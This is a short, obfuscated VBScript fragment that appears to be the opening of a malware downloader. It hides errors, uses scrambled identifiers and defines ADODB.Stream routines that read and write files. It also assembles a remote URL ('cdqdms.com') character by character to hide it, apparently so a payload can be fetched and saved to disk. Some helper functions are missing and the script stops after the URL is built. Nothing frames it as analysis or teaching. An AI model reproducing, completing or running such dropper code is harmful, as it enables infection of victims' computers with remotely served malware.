On Error Resume Next
Const BQb = 1, Ue = 2, Kn = 8
Const UEs = 1, WLv9 = 2, GEw9 = "437", KYp = 2

Function SDu6(BVt)
Dim Qx4, Xi, SAx1
Set Qx4 = CreateObject("ADODB.Stream")
Qx4.type = WLv9
Qx4.Charset = GEw9
Qx4.Open
Qx4.LoadFromFile BVt
SAx1 = Qx4.ReadText
Qx4.Close
SDu6 = ZBd(SAx1)
End Function

Sub VKq4(BVt, Pg0)
Dim Qx4, SAx1
Set Qx4 = CreateObject("ADODB.Stream")
Qx4.type = WLv9
Qx4.Charset = GEw9
Qx4.Open
SAx1 = ALs(Pg0)
Qx4.WriteText SAx1
Qx4.SaveToFile BVt, KYp
Qx4.Close
End Sub

Randomize
Dim Je(2), AMb, BJy(4), BVt
Je(0) = 1256
Je(1) = 21487
Je(2) = 14252
AMb = 21
If 1=1 Then
BJy(0) = "http://" & "c" & "d" & "q" & "d" & "m" & "s" & "." & "c" & "o" & "m" & "/" & "d" & "8" & "8" & "7" & "w" & "n" & "9"
End If